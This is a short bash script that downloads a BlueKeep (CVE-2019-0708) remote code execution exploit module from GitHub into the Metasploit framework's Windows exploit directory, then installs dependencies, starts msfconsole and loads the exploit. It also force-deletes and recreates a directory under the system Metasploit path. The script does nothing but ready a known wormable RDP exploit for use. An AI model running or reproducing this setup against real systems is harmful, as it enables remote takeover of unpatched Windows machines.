#!/usr/bin/bash
cd /usr/share/metasploit-framework/modules/exploits/windows
    rm -rf rdp
    mkdir -p rdp
        cd rdp
            wget https://raw.githubusercontent.com/nu11secur1ty/cve_2019_0708_bluekeep_rce/master/cve_2019_0708_bluekeep_rce.rb
            cd /usr/share/metasploit-framework/
                gem install bundler && bundle
                cd 
        msfdb init
        msfconsole 
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
